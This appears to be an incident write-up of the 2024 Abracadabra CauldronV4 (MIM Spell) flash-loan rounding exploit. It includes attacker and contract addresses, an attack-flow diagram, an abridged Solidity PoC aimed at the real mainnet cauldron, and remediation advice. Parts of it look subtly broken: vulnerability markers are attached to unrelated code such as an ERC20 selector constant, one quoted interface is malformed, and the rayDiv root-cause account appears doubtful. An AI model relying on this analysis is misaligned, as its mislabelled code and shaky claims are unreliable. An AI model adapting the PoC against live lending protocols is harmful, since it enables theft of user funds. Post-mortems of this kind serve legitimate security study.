# MIM Spell (2nd) — Precision Loss-Based Repayment Rounding Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-30 |
| **Protocol** | Abracadabra / MIM Spell (CauldronV4) |
| **Chain** | Ethereum |
| **Loss** | ~$6,500,000 |
| **Attacker** | [0x87f585809](https://etherscan.io/address/0x87f585809ce79ae39a5fa0c7c96d0d159eb678c9) |
| **Attack Contract** | [0xE1091D17](https://etherscan.io/address/0xE1091D17473b049CcCD65c54f71677Da85b77A45) |
| **Vulnerable Contract** | [CauldronV4 0x7259e152](https://etherscan.io/address/0x7259e152103756e1616a77ae982353c3751a6a90) |
| **Root Cause** | Rounding down error in `rayDiv()` causes debt to be eliminated by 1 unit every 90 borrow-repay cycles, enabling artificial debt erasure |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/MIMSpell2_exp.sol) |

---

## 1. Vulnerability Overview

Abracadabra's CauldronV4 uses the `rayDiv()` function for debt calculations, which produces rounding errors under certain conditions. The attacker took a 300,000 MIM flash loan from DegenBox, repaid all user debt via `repayForAll()`, then deployed a helper contract to repeat 90 small-amount borrow-repay cycles, accumulating rounding errors to borrow large amounts of MIM while repaying less than the actual debt.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: rayDiv rounding error
function rayDiv(uint256 a, uint256 b) internal pure returns (uint256) {
    return (a * RAY + b / 2) / b;
    // b/2 rounding accumulates, causing debt to be calculated lower than actual
}

// repayForAll → userBorrowPart decreases → borrow limit increases on subsequent borrows
function repayForAll(uint128 amount, bool skim) public returns (uint128) {
    // Proportionally reduces all user debt
    totalBorrow.elastic -= amount;
    // Each user's borrowPart decreases lower than expected due to rayDiv rounding
}

// ✅ Safe code: use ceiling rounding
function rayDiv(uint256 a, uint256 b) internal pure returns (uint256) {
    return (a * RAY + b - 1) / b;  // Rounds in the ceiling direction
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: CauldronV4.sol
    function borrow(address to, uint256 amount) public solvent returns (uint256 part, uint256 share) {  // ❌ Vulnerability
        accrue();
        (part, share) = _borrow(to, amount);
    }
```

```solidity
// File: IBentoBoxV1.sol
contract IFlashBorrower {
interface IFlashBorrower {
    /// @notice The flashloan callback. `amount` + `fee` needs to repayed to msg.sender before this call returns.
    /// @param sender The address of the invoker of this flashloan.
    /// @param token The address of the token that is loaned.
    /// @param amount of the `token` that is loaned.
    /// @param fee The fee that needs to be paid on top for this loan. Needs to be the same as `token`.
    /// @param data Additional data that was passed to the flashloan function.
    function onFlashLoan(
        address sender,
        IERC20 token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external;
}
```

```solidity
// File: BoringERC20.sol
library BoringERC20 {
    bytes4 private constant SIG_SYMBOL = 0x95d89b41; // symbol()  // ❌ Vulnerability
    bytes4 private constant SIG_NAME = 0x06fdde03; // name()
    bytes4 private constant SIG_DECIMALS = 0x313ce567; // decimals()
    bytes4 private constant SIG_BALANCE_OF = 0x70a08231; // balanceOf(address)
    bytes4 private constant SIG_TOTALSUPPLY = 0x18160ddd; // balanceOf(address)
    bytes4 private constant SIG_TRANSFER = 0xa9059cbb; // transfer(address,uint256)
    bytes4 private constant SIG_TRANSFER_FROM = 0x23b872dd; // transferFrom(address,address,uint256)

    function returnDataToString(bytes memory data) internal pure returns (string memory) {
        if (data.length >= 64) {
            return abi.decode(data, (string));
        } else if (data.length == 32) {
            uint8 i = 0;
            while (i < 32 && data[i] != 0) {
                i++;
            }
            bytes memory bytesArray = new bytes(i);
            for (i = 0; i < 32 && data[i] != 0; i++) {
                bytesArray[i] = data[i];
            }
            return string(bytesArray);
        } else {
            return "???";
        }
    }

    /// @notice Provides a safe ERC20.symbol version which returns '???' as fallback string.
    /// @param token The address of the ERC-20 token contract.
    /// @return (string) Token symbol.
    function safeSymbol(IERC20 token) internal view returns (string memory) {
        (bool success, bytes memory data) = address(token).staticcall(abi.encodeWithSelector(SIG_SYMBOL));
        return success ? returnDataToString(data) : "???";
    }

    /// @notice Provides a safe ERC20.name version which returns '???' as fallback string.
    /// @param token The address of the ERC-20 token contract.
    /// @return (string) Token name.
    function safeName(IERC20 token) internal view returns (string memory) {
        (bool success, bytes memory data) = address(token).staticcall(abi.encodeWithSelector(SIG_NAME));
        return success ? returnDataToString(data) : "???";
    }

    /// @notice Provides a safe ERC20.decimals version which returns '18' as fallback value.
    /// @param token The address of the ERC-20 token contract.
    /// @return (uint8) Token decimals.
    function safeDecimals(IERC20 token) internal view returns (uint8) {
        (bool success, bytes memory data) = address(token).staticcall(abi.encodeWithSelector(SIG_DECIMALS));
        return success && data.length == 32 ? abi.decode(data, (uint8)) : 18;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DegenBox flash: 300,000 MIM flash loan
  │
  ├─→ [2] repayForAll(): repay all user debt
  │         └─ userBorrowPart abnormally reduced due to rayDiv rounding
  │
  ├─→ [3] Curve: MIM → USDT swap
  │   ├─→ Uniswap V3: MIM → USDC → WETH swap
  │
  ├─→ [4] Deploy helper contract → 90 borrow-repay cycles
  │         └─ Rounding error accumulates each cycle
  │
  ├─→ [5] Add final collateral → borrow remaining MIM
  │
  ├─→ [6] Retrieve MIM → repay flash loan
  │
  └─→ [7] ~$6.5M profit (yvCurve-3Crypto-f collateral)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ICauldronV4 {
    function addCollateral(address to, bool skim, uint256 share) external;
    function borrow(address to, uint256 amount) external returns (uint256, uint256);
    function repay(address to, bool skim, uint256 part) external returns (uint256);
    function repayForAll(uint128 amount, bool skim) external returns (uint128);
    function userBorrowPart(address user) external view returns (uint256);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
}

contract AttackContract {
    ICauldronV4 constant cauldron = ICauldronV4(0x7259e152103756e1616a77ae982353c3751a6a90);
    IDegenBox   constant degenBox = IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);

    function testExploit() external {
        // [1] DegenBox flash loan 300,000 MIM
        degenBox.flashLoan(address(this), address(this), MIM, 300_000e18, "");
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external {
        // [2] Repay all user debt (triggers rounding error)
        cauldron.repayForAll(type(uint128).max, false);

        // [3] Swap tokens via Curve/Uniswap
        exchangeMIMToTokens();

        // [4] Run 90 cycles from helper contract
        HelperExploit helper = new HelperExploit();
        helper.runCycles(address(cauldron), 90);

        // [5] Add final collateral then borrow MIM
        cauldron.addCollateral(address(this), false, collateralShare);
        cauldron.borrow(address(this), remainingMIM);

        // [6] Repay flash loan
        degenBox.deposit(MIM, address(degenBox), address(this), 300_000e18, 0);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Precision Loss / Rounding Error |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (flash loan + rounding exploitation) |
| **DApp Category** | Collateralized Lending Protocol (Cauldron/Abracadabra) |
| **Impact** | Large-scale MIM borrowing without sufficient collateral |

## 6. Remediation Recommendations

1. **Use Ceiling Rounding**: Apply ceiling (round-up) instead of round-half-up for debt reduction calculations to prevent debt from being understated
2. **Validate Elastic/Base Invariant**: After `repayForAll`, verify that `totalBorrow.elastic` matches the sum of all `userBorrowPart` values
3. **Limit Repeated Borrow-Repay Calls**: Detect and block excessive repeated calls within the same block
4. **Minimum Debt Threshold**: Maintain a minimum value before debt reaches zero to mitigate rounding attacks

## 7. Lessons Learned

- In fixed-point arithmetic, rounding direction must always favor the protocol (debt calculations should use ceiling rounding).
- Global state-mutation functions like `repayForAll()` make it difficult to preserve precision for individual user states.
- Repeated-cycle attacks following a state reset via flash loan are complex but can be designed with mathematical precision.